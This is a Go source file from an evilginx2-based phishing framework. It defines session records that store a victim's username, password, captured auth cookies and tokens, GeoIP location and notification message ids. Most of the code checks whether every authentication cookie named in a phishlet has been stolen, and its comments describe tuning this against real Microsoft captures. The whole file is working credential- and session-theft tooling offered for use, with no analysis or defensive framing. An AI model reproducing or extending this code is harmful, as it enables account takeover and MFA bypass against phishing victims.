package core

import (
	"sort"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
)

type Session struct {
	Id           string
	Name         string
	Username     string
	Password     string
	Custom       map[string]string
	Params       map[string]string
	BodyTokens   map[string]string
	HttpTokens   map[string]string
	CookieTokens map[string]map[string]*database.CookieToken
	RedirectURL  string
	IsDone       bool
	IsAuthUrl    bool
	// Stage mirrors database.Session.Stage: how far the victim actually got.
	Stage          int
	IsForwarded    bool
	ProgressIndex  int
	RedirectCount  int
	PhishLure      *Lure
	RedirectorName string
	LureDirPath    string
	DoneSignal     chan struct{}
	IsCaptchaDone  bool
	RemoteAddr     string
	UserAgent      string
	Cmsgid         string
	Tmsgid         string
	// GeoIP fields — populated on session creation if GeoIP database is loaded
	GeoCountry string  `json:"geo_country"`
	GeoCity    string  `json:"geo_city"`
	GeoLat     float64 `json:"geo_lat"`
	GeoLon     float64 `json:"geo_lon"`
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:             GenRandomToken(),
		Name:           name,
		Username:       "",
		Password:       "",
		Custom:         make(map[string]string),
		Params:         make(map[string]string),
		BodyTokens:     make(map[string]string),
		HttpTokens:     make(map[string]string),
		RedirectURL:    "",
		IsDone:         false,
		IsAuthUrl:      false,
		IsForwarded:    false,
		ProgressIndex:  0,
		RedirectCount:  0,
		PhishLure:      nil,
		RedirectorName: "",
		LureDirPath:    "",
		DoneSignal:     make(chan struct{}),
		IsCaptchaDone:  false,
		RemoteAddr:     "",
		UserAgent:      "",
		Cmsgid:         "",
		Tmsgid:         "",
		// GeoIP fields initialized to zero values
		GeoCountry: "",
		GeoCity:    "",
		GeoLat:     0.0,
		GeoLon:     0.0,
	}
	s.CookieTokens = make(map[string]map[string]*database.CookieToken)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetCmsgid(cmsgid string) {
	s.Cmsgid = cmsgid
}

func (s *Session) SetTmsgid(tmsgid string) {
	s.Tmsgid = tmsgid
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddCookieAuthToken(domain string, key string, value string, path string, http_only bool, expires time.Time) {
	if _, ok := s.CookieTokens[domain]; !ok {
		s.CookieTokens[domain] = make(map[string]*database.CookieToken)
	}

	if tk, ok := s.CookieTokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.CookieTokens[domain][key] = &database.CookieToken{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}
}

// label names a declared auth token for reporting.
func (at *CookieAuthToken) label() string {
	if at.name != "" {
		return at.name
	}
	if at.re != nil {
		return at.re.String()
	}
	return "?"
}

// capturedAuthIndex returns captured cookie names keyed by domain with the
// leading dot stripped, so the same cookie lands in one bucket whether it
// arrived with or without a Domain attribute.
func (s *Session) capturedAuthIndex() map[string]map[string]bool {
	idx := map[string]map[string]bool{}
	for d, toks := range s.CookieTokens {
		key := strings.TrimPrefix(d, ".")
		if idx[key] == nil {
			idx[key] = map[string]bool{}
		}
		for n := range toks {
			idx[key][n] = true
		}
	}
	return idx
}

func tokenMatches(at *CookieAuthToken, name string) bool {
	if at.re != nil {
		return at.re.MatchString(name)
	}
	return at.name == name
}

// HasAnyCookieAuthToken reports whether at least one declared auth cookie has
// been captured. It distinguishes "no evidence at all" from "evidence complete",
// which matters because a session that has not yet reached any declared domain
// also has an empty missing set.
func (s *Session) HasAnyCookieAuthToken(authTokens map[string][]*CookieAuthToken) bool {
	idx := s.capturedAuthIndex()
	for domain, declared := range authTokens {
		names := idx[strings.TrimPrefix(domain, ".")]
		for _, at := range declared {
			for name := range names {
				if tokenMatches(at, name) {
					return true
				}
			}
		}
	}
	return false
}

// MissingCookieAuthTokens reports which of the phishlet's declared, non-optional
// auth cookies have not been captured, per domain.
//
// Two deliberate softenings, both learned from real captures:
//
//   - Domains are compared with the leading dot stripped. Microsoft sets some
//     cookies with a Domain attribute and some without, so the same name lands in
//     either bucket; matching on the dotted form alone reports false misses.
//   - Only domains we have actually seen are considered. A host the victim never
//     reached is not evidence of absence, which keeps consumer-vs-work and
//     SSO-vs-password flows workable.
//
// An empty result therefore means "the cookie evidence is complete" - use
// HasAnyCookieAuthToken to tell that apart from "nothing captured yet".
func (s *Session) MissingCookieAuthTokens(authTokens map[string][]*CookieAuthToken) map[string][]string {
	captured := s.capturedAuthIndex()

	out := map[string][]string{}
	for domain, declared := range authTokens {
		names, seen := captured[strings.TrimPrefix(domain, ".")]
		if !seen {
			continue
		}
		for _, at := range declared {
			if at.optional {
				continue
			}
			matched := false
			for name := range names {
				if tokenMatches(at, name) {
					matched = true
					break
				}
			}
			if !matched {
				out[domain] = append(out[domain], at.label())
			}
		}
	}
	return out
}

// missingSummary renders a missing-token map for logs and API reasons.
func missingSummary(m map[string][]string) string {
	if len(m) == 0 {
		return ""
	}
	domains := make([]string, 0, len(m))
	for d := range m {
		domains = append(domains, d)
	}
	sort.Strings(domains)
	parts := make([]string, 0, len(domains))
	for _, d := range domains {
		names := append([]string(nil), m[d]...)
		sort.Strings(names)
		parts = append(parts, d+": "+strings.Join(names, ", "))
	}
	return strings.Join(parts, "; ")
}

// AllCookieAuthTokensCaptured is the boolean form of MissingCookieAuthTokens.
func (s *Session) AllCookieAuthTokensCaptured(authTokens map[string][]*CookieAuthToken) bool {
	return len(s.MissingCookieAuthTokens(authTokens)) == 0
}

func (s *Session) Finish(is_auth_url bool) {
	if !s.IsDone {
		s.IsDone = true
		s.IsAuthUrl = is_auth_url
		if s.DoneSignal != nil {
			close(s.DoneSignal)
			s.DoneSignal = nil
		}
	}
}
